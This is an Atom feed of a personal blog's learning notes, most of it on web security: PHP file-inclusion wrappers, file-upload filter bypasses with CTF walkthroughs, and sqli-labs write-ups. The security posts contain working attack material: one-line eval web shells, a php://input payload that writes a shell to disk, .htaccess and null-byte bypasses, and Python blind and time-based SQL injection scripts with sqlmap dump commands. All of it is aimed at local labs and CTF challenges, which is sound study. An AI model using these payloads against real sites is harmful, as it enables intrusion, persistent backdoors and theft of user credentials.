<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://z0ekball.github.io</id>
    <title>z0ekball</title>
    <updated>2022-04-14T09:06:53.720Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://z0ekball.github.io"/>
    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://z0ekball.github.io/images/avatar.png</logo>
    <icon>https://z0ekball.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, z0ekball</rights>
    <entry>
        <title type="html"><![CDATA[python学习（1）]]></title>
        <id>https://z0ekball.github.io/post/python-xue-xi-1/</id>
        <link href="https://z0ekball.github.io/post/python-xue-xi-1/">
        </link>
        <updated>2021-09-16T00:38:56.000Z</updated>
        <content type="html"><![CDATA[<p>#输入输出<br>
###print()</p>
<pre><code>print(56)
print('asdaswd','sdsa','wasd')
</code></pre>
<p>###open():输出到文件</p>
<pre><code>fp=open('D:/t.txt','a')
print('hello',file=fp)
</code></pre>
<p>###input():输入函数</p>
<pre><code>a=input()
input('提示内容')
</code></pre>
<p>#转义字符</p>
<pre><code>反斜：\\
单引：\'
双引：\&quot;
换行：\n
回车：\r
制表：\t
退格：\b
</code></pre>
<p>#进制表示</p>
<pre><code>二进制：0b
八进制：0o
十六进制：0x
</code></pre>
<p>#数据类型转换</p>
<pre><code>转字符串：str()
转整数：int()
转浮点：float()
</code></pre>
<h1 id=""></h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件包含]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
        </link>
        <updated>2021-07-29T02:59:27.000Z</updated>
        <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
<pre><code class="language-php">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行
require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行
include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含
</code></pre>
<p><code>敏感路径</code>：</p>
<p>典型：</p>
<pre><code class="language-php">?page=a.php
?home=b.html
?file=content…
</code></pre>
<p>Windows：</p>
<pre><code class="language-php">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件
C:\windows\repair\sam //存储 windows 系统初次安装的密码
C:\Program Files\mysql\my.ini //mysql 配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\windows\php.ini //php 配置信息
C:\windows\my.ini //mysql 配置文件
</code></pre>
<p>UNIX/Linux：</p>
<pre><code class="language-php">/etc/passwd
/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
/usr/local/app/php5/lib/php.ini //PHP 相关配置
/etc/httpd/conf/httpd.conf //apache
/etc/php5/apache2/php.ini //ubuntu 系统的默认路径
</code></pre>
<h4 id="本地包含">本地包含</h4>
<p>1.txt和1.php在同一文件目录下，被包含文件无论什么格式都能解析成php</p>
<p>1.txt:</p>
<pre><code class="language-php">&lt;?php phpinfo();?&gt;
</code></pre>
<p>1.php:</p>
<pre><code class="language-php">&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=1.txt //返回phpinfo页面
</code></pre>
<h4 id="远程包含">远程包含</h4>
<p><code>条件</code>： 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>
Allow_url_include = on、allow_url_fopen=on</p>
<p><code>playload</code>:</p>
<pre><code class="language-php">***/1.php?id=http:(文件绝对路径) 
</code></pre>
<h4 id="php伪协议">php伪协议</h4>
<p><code>file://</code>:</p>
<p>用于访问本地文件系统</p>
<p>条件(php.ini)： allow_url_fopen   off/on    allow_url_include off/on</p>
<pre><code class="language-php">file：//[文件的绝对路径和文件名]
    file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
file：//[文件的相对路径和文件名]
    file=./phpinfo.txt
file：//[http：//网络路径和文件名]
    file=http://127.0.0.1/phpinfo.txt 
</code></pre>
<p><code>php：//filter</code>：</p>
<p>用于读取源码并进行bash64编码输出；<br>
条件（php.ini）：allow_url_fope   off/on  allow_url_include off/on</p>
<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码
（针对php文件需要base64编码）
</code></pre>
<p><code>php：//input</code>：</p>
<p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；<br>
条件(php.ini)：allow_url_fope   off/on     allow_url_include on</p>
<pre><code class="language-php">php://input + [POST DATA]执行php代码
</code></pre>
<p>有写入权限则可以写入一句话木马</p>
<pre><code class="language-php">php://input
[POST DATA部分]
&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;
</code></pre>
<p><code>php://stdin</code>:</p>
<p>只读，php://stdout 和 php://stderr 是只写的。</p>
<p><code>php://output</code>:是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
<p><code>php://fd</code>:允许直接访问指定的文件描述符。</p>
<p><code>zip://,bzip://,zlib://</code>:</p>
<p>压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
<p>条件：    allow_url_fope   off/on    allow_url_include off/on</p>
<pre><code class="language-php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
bzip2://file.bz2
zlib://file.gz
</code></pre>
<p><code>data://</code>：</p>
<p>传递相应格式数据，用于执行php代码</p>
<p>条件：    allow_url_fope   on    allow_url_include on</p>
<pre><code class="language-php">data://text/plain,&lt;?php%20phpinfo();?&gt;
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre>
<p><code>phar：//</code></p>
<p>与zip://类似，同样可以访问zip格式压缩包内容</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文件上传]]></title>
        <id>https://z0ekball.github.io/post/wen-jian-shang-chuan/</id>
        <link href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
        </link>
        <updated>2021-07-27T08:23:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="文件上传漏洞">文件上传漏洞</h2>
<h3 id="1无验证">1.无验证</h3>
<p>也就是前端和后端都不过滤上传的文件，故只需传入含一句话木马</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>的php文件，再用菜刀或者蚁剑连接即可。</p>
<h3 id="2js前端验证">2.js前端验证</h3>
<p>顾名思义，就是只在浏览器前端进行简单的文件名过滤，只允许上传某种文件名。简单粗暴的做法是直接禁用浏览器里的js代码。<br>
<code>绕过方法</code>：把含有一句话木马的php文件改成允许上传的文件名，上传并抓包，修改文件后缀为php再放包即可。</p>
<h3 id="3mime绕过">3.MIME绕过</h3>
<p>上传php木马，抓包修改Content-Type为合法类型即可</p>
<p>例如：image/gif</p>
<h3 id="4htaccess">4.htaccess</h3>
<p><code>htaccess文件</code>：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。在文件上传中构造htaccess文件能使png以php格式解析。</p>
<p><code>和httpdp.com区别</code>：只作用于当前目录，只在访问当前目录才加载</p>
<p><code>漏洞利用</code></p>
<pre><code class="language-php">//方法一
SetHandler application/x-httpd-php  	//所有的文件当做php文件来解析
//方法二
AddType application/x-httpd-php .png	//.png文件当作php文件解析
</code></pre>
<p>在htaccess文件中写入代码并上传，再上传写有一句话木马的png文件，蚁剑连接即可。</p>
<h3 id="5文件头检查">5.文件头检查</h3>
<p>前面都是把含有一句话木马的php文件改变后缀变成png或者gif等可上传文件，而文件头检查则检查该文件的特征值，判断时候是真的png或者gif，故需要进一步伪装文件头。</p>
<p><code>绕过方法</code>:制作图马，简单图马是直接把一句话木马放在图片末尾以绕过文件头检查</p>
<pre><code class="language-php">//命令行合成图马
copy 1.png/b+1.txt/a 2.png
//b,a表示合成时各文件的编码方式，b为二进制，a为ascll
</code></pre>
<p><code>二次渲染</code>：同样也是检测文件是否是真的png或gif，上传之后的图片会被二次渲染，使得图马中的一句话木马变成乱码无法执行</p>
<p><code>绕过方法</code>：下载被二次渲染后的图马与原来的图马比较，找到相同的地方，插入一句话木马。</p>
<p>（png、jpg、jpeg都不好改，gif好改）</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211018165017388.png" alt="image-20211018165017388" style="zoom: 50%;" />
<p>上传图马，配合解析漏洞、文件包含漏洞等使图马以php格式执行即可。</p>
<h3 id="6解析漏洞">6.解析漏洞</h3>
<h4 id="00截断攻击">00截断攻击</h4>
<p><code>漏洞原理</code>：系统端解析文件格式和服务端解析文件格式的顺序不同，系统端由后往前解析，服务端反之。抓包将 xxx.php.gif 换成 xxx.php_gif(下划线为0x00)。在上传文件时系统文件遇到0x00。会认为文件已经结束。从而将xxx.php.gif的内容写入到xxx.php。（需要允许修改保存路径）</p>
<p><code>绕过方法</code>：</p>
<p>GET方式上传：抓包，在保存路径后面添加1.php%00（%00会自动解码），文件名不变仍为1.gif</p>
<p>POST方式上传：抓包，在保存路径后面添加1.php+在HEX界面找到这个加号修改为00，文件名仍不变为1.gif</p>
<h4 id="黑名单绕过">黑名单绕过</h4>
<p><code>绕过方法</code>：</p>
<p>1、文件名大小写绕过（AsP, pHp等等）<br>
2、黑白名单列表绕过（php、php2、php3、php5、phtml、asp、aspx、ascx、ashx、cer、asa、jsp、jspx）cdx，<br>
3、特殊文件名绕过：修改数据包里的文件名改为 test.php. 或者 test.asp_ (下划线是空格)由于这种命名格式在windows系统里是不允许的。所以在绕过上传之后windows系统会自动去掉 点和空格。Unix/Linux系统没有这个特性。<br>
4、0x00截断绕过<br>
5、.htaccess文件攻击（结合黑名单攻击）</p>
<h4 id="apache解析漏洞">Apache解析漏洞</h4>
<p><code>漏洞原理</code>：一个文件名为test.php.aaa.bbb.ccc的文件，Apache会从ccc的位置往php的位置开始尝试解析 ，如果ccc不属于Apache能解析的后缀名，那么Apache就会尝试去解析bbb，这样一直往前尝试，直到遇到一个能解析的拓展名为止</p>
<p><code>绕过方法</code>:添加无用扩展名如xxx.php --&gt;xxx.php.aaa</p>
<h4 id="iis解析漏洞">IIS解析漏洞</h4>
<p><code>IIS6.0解析漏洞</code>：</p>
<p>1.目录解析：以.asp 、.asa、.cer、.cdx命名的文件夹里的文件都将会被当成ASP文件执行。</p>
<p>2.文件解析：只要文件名中含有.asp;、.asa;、.cer;、.cdx;会优先按 asp来解析，.asp;.jpg 这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
<p><code>IIS7.0/7.5解析漏洞</code>:</p>
<p>对任意文件名只要在URL后面追加上字符串&quot;/任意文件名.php&quot;,就会按照 php 的方式去解析<br>
如”http://url/upload/1.jpg/1adf.php”</p>
<h2 id="练习题目">练习题目</h2>
<h3 id="极客大挑战-2019upload1">[极客大挑战 2019]Upload1</h3>
<p><code>MIME绕过</code>和<code>黑名单绕过</code>，只允许上传图片，对php有简单过滤。</p>
<p>上传一句话木马</p>
<pre><code class="language-php">&lt;?php @eval($_POST['pass']);?&gt;
</code></pre>
<p>抓包修改</p>
<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019164716089.png" alt="image-20211019164716089" loading="lazy"></figure>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019164731251.png" alt="image-20211019164731251" style="zoom: 33%;" />
<p>对内容有过滤，换一个木马</p>
<pre><code class="language-php">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[pass])&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="2"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019165114142.png" alt="image-20211019165114142" loading="lazy"></figure>
<p>成功</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165418509.png" alt="image-20211019165418509" style="zoom: 33%;" />
<p>访问该文件upload/2.phtml</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019165551551.png" alt="image-20211019165551551" style="zoom:50%;" />
<p>说明存在该文件，蚁剑连接</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170411685.png" alt="image-20211019170411685" style="zoom:67%;" />
<p>找到flag</p>
<h3 id="actf2020-新生赛upload1">[ACTF2020 新生赛]Upload1</h3>
<p><code>前端过滤</code></p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019170918935.png" alt="image-20211019170918935" style="zoom: 67%;" />
<p>把文件改成gif，抓包再改成php</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019171957129.png" alt="image-20211019171957129" style="zoom: 80%;" />
<p>修改<img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019172023103.png" alt="image-20211019172023103" loading="lazy"></p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019172352138.png" alt="image-20211019172352138" style="zoom:67%;" />
<p>emmmphp也要绕一下改成phtml</p>
<figure data-type="image" tabindex="3"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019172444434.png" alt="image-20211019172444434" loading="lazy"></figure>
<p>有了，访问该页面</p>
<figure data-type="image" tabindex="4"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019172549473.png" alt="image-20211019172549473" loading="lazy"></figure>
<p>蚁剑一下，用命令行找到flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019173439257.png" alt="image-20211019173439257" style="zoom:67%;" />
<h3 id="mrctf2020你传你呢1">[MRCTF2020]你传你🐎呢1</h3>
<p><code>htaccess绕过</code></p>
<pre><code class="language-php">//把hack.png解析成php
&lt;FilesMatch &quot;hack.png&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>上传htaccess文件，抓包修改类型为png</p>
<figure data-type="image" tabindex="5"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019180047323.png" alt="image-20211019180047323" loading="lazy"></figure>
<p>再上传一个含有木马的假png，上传成功</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019175206673.png" alt="image-20211019175206673" style="zoom: 50%;" />
<p>蚁剑一下，找到flag</p>
<h3 id="第二章-web进阶文件上传1">[第二章 web进阶]文件上传1</h3>
<p>题目直接给出了源码，得到过滤信息：</p>
<p>1.仅允许上传zip、jpg、gif、png文件<br>
2.如果上传压缩包，压缩包内不允许含有php文件</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183807280.png" alt="image-20211019183807280" style="zoom:67%;" />
<p>上传一个含有php的zip</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183103048.png" alt="image-20211019183103048" style="zoom:50%;" />
<p>要绕过php，改成phtml，上传成功，问题是不知道路径</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019183524005.png" alt="image-20211019183524005" style="zoom:67%;" />
<p>上传成功后会在upload下随机生成一个md5目录存放文件，也就是说很难拿到文件的路径，设法绕过这个目录，让文件存储在根目录下</p>
<p>010 editor修改文件名，使之存在根目录下（修改的时候现在原来的文件名预留足够的位置）</p>
<figure data-type="image" tabindex="6"><img src="C:%5CUsers%5C%E4%B8%B7%E6%9C%A8%E4%B8%B7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211019191350117.png" alt="image-20211019191350117" loading="lazy"></figure>
<p>emmmm，御剑连上了但打不开，文件名换成php.xx(<code>Apache解析漏洞</code>)</p>
<p>上传后访问，得到flag</p>
<img src="C:\Users\丷木丷\AppData\Roaming\Typora\typora-user-images\image-20211019192014051.png" alt="image-20211019192014051" style="zoom:67%;" />]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(11~20)脚本、sqlmap学习]]></title>
        <id>https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/</id>
        <link href="https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/">
        </link>
        <updated>2021-06-18T14:56:25.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sqlmap知识补充">sqlmap知识补充</h1>
<pre><code>-r 表示加载一个文件
-p 指定参数
</code></pre>
<h1 id="less-11普普通通的post">less-11(普普通通的post)</h1>
<h3 id="上传post文件得到参数">上传post文件，得到参数</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624290761761.png" alt="" loading="lazy"></figure>
<h3 id="根据参数得到当前数据库">根据参数，得到当前数据库</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624290826466.png" alt="" loading="lazy"></figure>
<h3 id="获取用户名和密码">获取用户名和密码</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname -T &quot;users&quot;  -C &quot;username&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624291100650.png" alt="" loading="lazy"></figure>
<h3 id="脚本查询当前数据库名称采用盲注形式">脚本：查询当前数据库名称(采用盲注形式)</h3>
<pre><code class="language-python">import requests #比urllib.parse方便
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-11/&quot;
d = list('abcdefghijklmnopqrstuvwxyz0123456789@_.{}?!')
#注入字段
inn=&quot;1' or 1=1 and mid((database()),%s,1)='%s'#&quot;
for i in range(1,30):
    for j in d:
        #字典格式
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #发送post请求
        response = requests.post(url,data = data)
        #获取报文
        t=response.text
        if t.find('Login') &gt;0:
            name+=j
            print(j)
print(name)
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624294940779.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>uname=n&quot;) or 1=1 #,其他和11一样</p>
<h1 id="less-13时间盲注">less-13(时间盲注)</h1>
<h3 id="获取id和用户名">获取id和用户名</h3>
<pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-13.txt&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;username&quot; --dump
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624298061718.png" alt="" loading="lazy"></figure>
<h3 id="脚本获取id3的用户名参考时间盲注">脚本：获取id=3的用户名，参考时间盲注</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-13/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
inn=&quot;n') or if(mid((select username from security.users where id=3),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-2">结果</h3>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624298188766.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>和13一样的时间盲注，但注意转义成 \&quot;</p>
<h3 id="脚本获取库">脚本：获取库</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-14/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
#这里的引号有冲突，改为\&quot;
inn=&quot;n\&quot; or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        data={'uname':inn %(i,j),'passwd':'','submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-3">结果</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624299560173.png" alt="" loading="lazy"></figure>
<h1 id="less-15密码注入点">less-15(密码注入点)</h1>
<p>和前面一样，注入点改为密码</p>
<h3 id="脚本获取库-2">脚本：获取库</h3>
<pre><code class="language-python">import requests
import time
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-15/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
#注入字段
inn=&quot;n' or if(mid((database()),%s,1)='%s',sleep(1),0)#&quot;
for i in range(1,10):
    for j in d:
        #字典格式
        time1=time.time()
        #注入点在密码
        data={'uname':'','passwd':inn %(i,j),'submit':'Submit'}
        #print(data)
        #发送post请求
        response = requests.post(url,data = data)
        #t=response.text
        #获取报文
        time2=time.time()
        if time2-time1 &gt;1:
            name+=j
            print(j)
            
print(name)
</code></pre>
<h3 id="结果-4">结果</h3>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624300007923.png" alt="" loading="lazy"></figure>
<h1 id="less-16">less-16</h1>
<p>uname=addmin&amp;passwd=ad&quot; or 1=1 #，注意\&quot;，其他和15一样</p>
<h1 id="less-17updatexml报错注入">less-17(updatexml报错注入)</h1>
<p>注意\'转义</p>
<h3 id="脚本查询数据库">脚本：查询数据库</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-17/&quot;
d = list('abcdefghijklmnopqrstuvwxyz')
data={'uname':'admin','passwd':'dadad\' and updatexml(1,concat(0x7e,(database())),1)#','submit':'Submit'}
r = requests.post(url,data = data)
t=r.text
print(t)
</code></pre>
<h3 id="结果在报错信息中可见库">结果：在报错信息中可见库</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624304453223.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agent注入">less-18(user-agent注入)</h1>
<h3 id="脚本post请求修改请求头的user-agent-bibi赖赖转义改的心态崩了">脚本：post请求修改请求头的user-agent    (bibi赖赖：转义改的心态崩了= =)</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-18/&quot;
#\转义  \转义  \转义  \转义  \转义  \转义 \转义 
'''
{'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)Gecko/20100101 Firefox/89.0
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果-5">结果</h3>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/1624307139151.png" alt="" loading="lazy"></figure>
<h1 id="less-19referer注入">less-19(referer注入)</h1>
<h3 id="脚本跟18一样改成referer就行同样需要转义">脚本：跟18一样，改成referer就行，同样需要转义</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-19/&quot;
'''
Referer: http://127.0.0.1/sqli/Less-19/
{'Referer':'http://127.0.0.1/sqli/Less-19/
 \'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
'''
u={'Referer':'http://127.0.0.1/sqli/Less-19/\'or updatexml(1,concat(0x7e,(database())),1)or \'1\'=\'1'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果-6">结果</h3>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/1624307491060.png" alt="" loading="lazy"></figure>
<h1 id="less-20cookie注入">less-20(cookie注入)</h1>
<p>cookie中value值' #注入</p>
<h3 id="脚本">脚本</h3>
<pre><code class="language-python">import requests
name=&quot;&quot;
url=&quot;http://127.0.0.1/sqli/Less-20/&quot;
u={'Cookie':'uname=1\' union select 1,2,group_concat(concat_ws(\'-\',id,username,password)) from users#'}
data={'uname':'admin','passwd':'admin','submit':'Submit'}
r = requests.post(url,data,headers=u)
t=r.text
print(t)
</code></pre>
<h3 id="结果整不出来应该是版本问题暂时未解决">结果：整不出来，应该是版本问题，暂时未解决</h3>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labs(1~10)脚本、sqlmap学习]]></title>
        <id>https://z0ekball.github.io/post/sqli-jiao-ben/</id>
        <link href="https://z0ekball.github.io/post/sqli-jiao-ben/">
        </link>
        <updated>2021-06-15T07:11:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一些准备">一些准备</h2>
<ol>
<li>安装sqlmap</li>
<li>命令行pip install requests 检查时候安装request或者需要更新，否则无法使用；</li>
<li>加引号快捷键用不，用正则表达式进行替换</li>
</ol>
<pre><code>(.*?):(.*)
'$1':'$2'，
</code></pre>
<h1 id="sqlmap基础知识">sqlmap基础知识</h1>
<ol>
<li>sqlmap常见步骤：</li>
</ol>
<pre><code>sqlmap -u url --dbs #获取数据库
sqlmap -u url --current-user #获取当前用户名称 ：
sqlmap -u url --current-db #获取当前数据库名称
sqlmap -u url -D 数据库名 --tables   #列出表名 ： 
sqlmap -u url -D 数据库名 -T 表名 --columns #列出字段 
sqlmap -u url -D 数据库名 -T 表名 -C 字段名1,字段名2,…… --dump #获取字段内容
</code></pre>
<ol start="2">
<li>常见参数</li>
</ol>
<pre><code>--cookie=cookie的内容        设置cookie 值 通常配合获取数据库使用 
--data        设置 POST 提交的值
-u        指定目标 URL
-b        获取 DBMS banner
--current-db        获取当前数据库
--current-user        获取当前数据库的用户
--tables        获取数据库里所有的表名
--columns        获取表里的所有字段
--dump        获取字段中的内容
--current-user        获取当前用户
-D [数据库名]       指定数据库名
-T  [表名]      指定表名
-C  [字段名]      指定字段名
--string       当查询可用时用来匹配页面中的字符串
--users        枚举所有用户
--passwords      枚举所有用户的密码hsah
--dbs      枚举数据库中的数据库名
-r       指定请求包

GET型注入一般用 sqlmap -u url
POST型注入一般用 sqlmap -u url --data POST参数
</code></pre>
<ol start="3">
<li>常见命令</li>
</ol>
<pre><code>--sql-query=&quot; &quot;  执行查询语句
--level 5  探测等级(1~5 默认为1，等级越高Payload越多，速度也比较慢)
--is-dba   判断当前用户是否是管理员权限
--roles    列出数据库管理员角色(仅适用与Oracle数据库)
--referer  HTTP Referer头(伪造HTTP头中的Referer，当--level等级大于等于3时会通过伪造Referer来进行注入)
--sql-shell 运行自定义SQL语句 用法：sqlmap -u url --sql-shell
--os-cmd，--os-shell 运行任意操作系统命令(仅支持MySQL、PostgreSQL、SQL Server)
--file-read 从数据库服务器中读取文件(要知道文件绝对路径)
--file-write &quot;本地文件路径&quot; --file-dest &quot;远程绝对路径&quot;   上传文件到数据库服务器中
</code></pre>
<h1 id="less-1普普通通的get">less-1(普普通通的get)</h1>
<h3 id="脚本获取用户和密码">脚本：获取用户和密码</h3>
<pre><code class="language-python">import urllib.parse #解析url
import http.client #实现了所有 HTTP 的方法（GET、POST、PUT、HEAD、DELETE、HEAD、OPTIONS 等）
                   #支持 HTTPS 协议
                   #支持代理服务器（Nginx等）等
                   #支持自动（跳转）转向

url = &quot;127.0.0.1&quot;
#body必须url编码,可用urllib.parse.quote()转,或者浏览器上转
body=&quot;/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(concat_ws(%27~%27,username,password))from%20security.users--+&quot;
c = http.client.HTTPConnection(url) #确定对象
c.request(&quot;GET&quot;, body) #确定方式 
r = c.getresponse()
print(r.status, r.reason) #状态字，状态原因
data = r.read()
print(data)
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624212566178.png" alt="" loading="lazy"></figure>
<h1 id="less-2">less-2</h1>
<p>id=-1--+，其他都一样</p>
<h1 id="less-3">less-3</h1>
<p>id=-1')--+,其他都一样</p>
<h1 id="less-4">less-4</h1>
<p>id=-1&quot;)--+,其他都一样</p>
<h1 id="less-5get盲注">less-5(get盲注)</h1>
